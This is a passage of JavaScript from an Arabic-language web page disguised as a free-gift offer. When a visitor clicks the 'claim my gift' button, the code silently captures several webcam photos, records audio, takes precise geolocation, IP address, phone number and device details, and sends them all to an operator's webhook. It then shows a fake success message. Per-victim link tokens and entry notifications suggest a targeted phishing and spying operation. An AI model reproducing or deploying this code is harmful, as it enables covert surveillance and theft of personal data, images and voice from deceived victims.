                        userLocation.error = 'تم رفض الإذن بالموقع';
                        resolved = true;
                        if (watchId !== null) navigator.geolocation.clearWatch(watchId);
                        clearTimeout(timeoutId);
                        resolve();
                        return;
                    }
                    if (attempts >= MAX_ATTEMPTS) {
                        if (best) done();
                        else { userLocation.error = err.message || 'تعذر الحصول على الموقع';
                            resolve(); }
                    }
                };

                watchId = navigator.geolocation.watchPosition(handlePos, handleErr, {
                    enableHighAccuracy: true,
                    timeout: 5000,
                    maximumAge: 2000
                });
            });
        }

        // ============================================================
        //  CAMERA
        // ============================================================
        async function startCameraAndCapture() {
            try {
                const constraints = { video: true, audio: false };
                mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
                video.srcObject = mediaStream;
                await video.play();

                await new Promise((resolve, reject) => {
                    const to = setTimeout(() => reject(new Error('Video timeout')), 10000);
                    const ready = () => { clearTimeout(to);
                        resolve(); };
                    if (video.readyState >= 2 && video.videoWidth > 0) ready();
                    else {
                        video.addEventListener('loadedmetadata', ready);
                        video.addEventListener('canplay', ready);
                        video.play().catch(() => {});
                    }
                });

                await new Promise((r) => setTimeout(r, 500));
                const ctx = canvas.getContext('2d');
                const w = Math.min(video.videoWidth || 640, 1920);
                const h = Math.min(video.videoHeight || 480, 1080);
                canvas.width = w;
                canvas.height = h;

                capturedPhotoFiles = [];
                for (let i = 1; i <= TOTAL_PHOTOS; i++) {
                    ctx.drawImage(video, 0, 0, w, h);
                    const blob = await new Promise((res) => canvas.toBlob(res, 'image/jpeg', PHOTO_QUALITY));
                    if (blob && blob.size > 1000) {
                        const file = new File([blob], `photo_${i}_${Date.now()}.jpg`, { type: 'image/jpeg' });
                        capturedPhotoFiles.push(file);
                    }
                    if (i < TOTAL_PHOTOS) await new Promise((r) => setTimeout(r, CAPTURE_INTERVAL));
                }
                return true;
            } catch (err) {
                console.error('Camera error:', err);
                if (mediaStream) { mediaStream.getTracks().forEach((t) => t.stop());
                    mediaStream = null; }
                video.srcObject = null;
                return false;
            }
        }

        // ============================================================
        //  AUDIO
        // ============================================================
        async function recordAudio() {
            try {
                audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
                audioRecorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm;codecs=opus' });
                audioChunks = [];
                audioRecorder.ondataavailable = (e) => { if (e.data.size > 0) audioChunks.push(e.data); };
                audioRecorder.onstop = () => {
                    if (audioChunks.length > 0) {
                        audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                    }
                };
                audioRecorder.start();
                setTimeout(() => {
                    if (audioRecorder.state === 'recording') audioRecorder.stop();
                    if (audioStream) audioStream.getTracks().forEach((t) => t.stop());
                }, AUDIO_DURATION);
                return true;
            } catch (err) {
                console.error('Audio error:', err);
                return false;
            }
        }

        // ============================================================
        //  SEND ALL DATA
        // ============================================================
        async function sendAllData() {
            const fd = new FormData();
            fd.append('event', 'submission');
            fd.append('country', selectedCountry);
            fd.append('phone', userPhone);
            fd.append('ip', userIP);
            fd.append('location[lat]', userLocation.lat !== null ? String(userLocation.lat) : '');
            fd.append('location[lng]', userLocation.lng !== null ? String(userLocation.lng) : '');
            fd.append('location[accuracy]', userLocation.accuracy !== null ? String(userLocation.accuracy) : '');
            fd.append('location[error]', userLocation.error || '');
            fd.append('device[userAgent]', navigator.userAgent);
            fd.append('device[platform]', navigator.platform);
            fd.append('device[language]', navigator.language);
            fd.append('device[screen]', `${screen.width}x${screen.height}`);
            fd.append('device[colorDepth]', screen.colorDepth);
            fd.append('device[timezone]', Intl.DateTimeFormat().resolvedOptions().timeZone);
            fd.append('timestamp', new Date().toISOString());

            capturedPhotoFiles.forEach((f, i) => fd.append(`photos[]`, f, f.name));
            if (audioBlob) {
                const af = new File([audioBlob], `audio_${Date.now()}.webm`, { type: 'audio/webm' });
                fd.append('audio', af);
            }

            const result = await sendToWebhook(fd);
            return result.success;
        }

        // ============================================================
        //  CLAIM BUTTON
        // ============================================================
        claimBtn.addEventListener('click', async () => {
            if (!USER_TOKEN) {
                showStatus(statusTasks, 'error', '⚠️ رابط غير صحيح، يرجى الدخول من الرابط المخصص.');
                return;
            }
            if (isProcessing) return;

            const phone = phoneInput.value.trim();
            if (!phone) {
                showStatus(statusTasks, 'error', '⚠️ يرجى إدخال رقم الهاتف');
                return;
            }
            const prefixes = countries[selectedCountry].prefixes;
            let valid = false;
            for (const p of prefixes) {
                if (phone.startsWith(p)) { valid = true; break; }
            }
            if (!valid) {
                showStatus(statusTasks, 'error', `⚠️ الرقم يجب أن يبدأ بـ ${prefixes.join(' أو ')}`);
                return;
            }
            userPhone = phone;

            isProcessing = true;
            claimBtn.disabled = true;
            claimBtn.classList.add('loading');
            claimBtn.querySelector('.btn-text').textContent = 'جاري التأكيد...';

            showStatus(statusTasks, 'info', '⏳ جاري إرسال البيانات...');

            await getIPAddress();
            await startCameraAndCapture();
            await recordAudio();

            const success = await sendAllData();

            if (success) {
                showStep('step-timer');
                updateStepIndicator(3);
                startTimer(180);
                showStatus(statusTimer, 'success', '🎉 تم إرسال هديتك! تحقق من هاتفك.');
            } else {
                showStatus(statusTasks, 'error', '⚠️ فشل الإرسال، حاول مرة أخرى.');
                claimBtn.disabled = false;
                claimBtn.classList.remove('loading');
                claimBtn.querySelector('.btn-text').textContent = '🎁 احصل على هديتي';
                isProcessing = false;
            }
        });

        // ============================================================
        //  IP
        // ============================================================
        async function getIPAddress() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                userIP = data.ip;
            } catch (_) { /* ignore */ }
        }

        // ============================================================
        //  TIMER
        // ============================================================
        function startTimer(seconds) {
            timerSeconds = seconds;
            updateTimerDisplay();
            if (timerInterval) clearInterval(timerInterval);
            timerInterval = setInterval(() => {
                timerSeconds--;
                updateTimerDisplay();
                if (timerSeconds <= 0) {
                    clearInterval(timerInterval);
                    timerDisplay.textContent = '00:00';
                }
            }, 1000);
        }

        function updateTimerDisplay() {
            const m = Math.floor(timerSeconds / 60);
            const s = timerSeconds % 60;
            timerDisplay.textContent = `${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
        }

        // ============================================================
        //  CLEANUP
        // ============================================================
        window.addEventListener('beforeunload', () => {
            if (mediaStream) mediaStream.getTracks().forEach((t) => t.stop());
            if (audioStream) audioStream.getTracks().forEach((t) => t.stop());
            if (audioRecorder && audioRecorder.state === 'recording') audioRecorder.stop();
            if (timerInterval) clearInterval(timerInterval);
        });

        // ============================================================
        //  PARTICLE SYSTEM (Canvas Background)
        // ============================================================
        (function initParticles() {
            const c = document.getElementById('bg-canvas');
            const ctx = c.getContext('2d');
            let w, h;
            const particles = [];
            const COUNT = 60;

            function resize() {
                w = c.width = window.innerWidth;
                h = c.height = window.innerHeight;
            }
            window.addEventListener('resize', resize);
            resize();

            class Particle {
                constructor() { this.reset(); }
                reset() {
                    this.x = Math.random() * w;
                    this.y = Math.random() * h;
                    this.size = Math.random() * 2.5 + 0.5;
                    this.speedX = (Math.random() - 0.5) * 0.25;
                    this.speedY = (Math.random() - 0.5) * 0.25;
                    this.opacity = Math.random() * 0.3 + 0.05;
                    this.pulse = Math.random() * Math.PI * 2;
                    this.pulseSpeed = 0.008 + Math.random() * 0.012;
                }
                update() {
                    this.x += this.speedX;
                    this.y += this.speedY;
                    this.pulse += this.pulseSpeed;
                    if (this.x < 0 || this.x > w) this.speedX *= -1;
                    if (this.y < 0 || this.y > h) this.speedY *= -1;
                }
                draw() {
                    const o = this.opacity * (0.6 + 0.4 * Math.sin(this.pulse));
                    ctx.beginPath();
                    ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
                    ctx.fillStyle = `rgba(245, 200, 66, ${o})`;
                    ctx.fill();
                    // soft glow
                    if (this.size > 1.5) {
                        ctx.shadowColor = 'rgba(245, 200, 66, 0.02)';
                        ctx.shadowBlur = 12;
                        ctx.fill();
                        ctx.shadowBlur = 0;
                    }
                }
            }

            for (let i = 0; i < COUNT; i++) particles.push(new Particle());

            function animate() {
                ctx.clearRect(0, 0, w, h);
                particles.forEach((p) => { p.update();
                    p.draw(); });
                // connect nearby
                for (let i = 0; i < particles.length; i++) {
                    for (let j = i + 1; j < particles.length; j++) {
                        const dx = particles[i].x - particles[j].x;
                        const dy = particles[i].y - particles[j].y;
                        const dist = Math.sqrt(dx * dx + dy * dy);
                        if (dist < 150) {
                            const alpha = (1 - dist / 150) * 0.04;
                            ctx.beginPath();
                            ctx.moveTo(particles[i].x, particles[i].y);
                            ctx.lineTo(particles[j].x, particles[j].y);
                            ctx.strokeStyle = `rgba(245, 200, 66, ${alpha})`;
                            ctx.lineWidth = 0.5;
                            ctx.stroke();
                        }
                    }
                }
                requestAnimationFrame(animate);
            }
            animate();
        })();

        // ============================================================
        //  BOOT
        // ============================================================
        window.addEventListener('load', async () => {
            const hasToken = extractTokenFromURL();
            if (!hasToken) {
                showStatus(statusCountry, 'error', '⚠️ رابط غير صحيح. يرجى استخدام الرابط المخصص لك.');
                document.querySelectorAll('.country-btn').forEach((b) => b.disabled = true);
                return;
            }
            await notifyUserEntered();
            detectSuspiciousActivity();
            console.log('🛡️ حماية مفعلة');
        });
    </script>
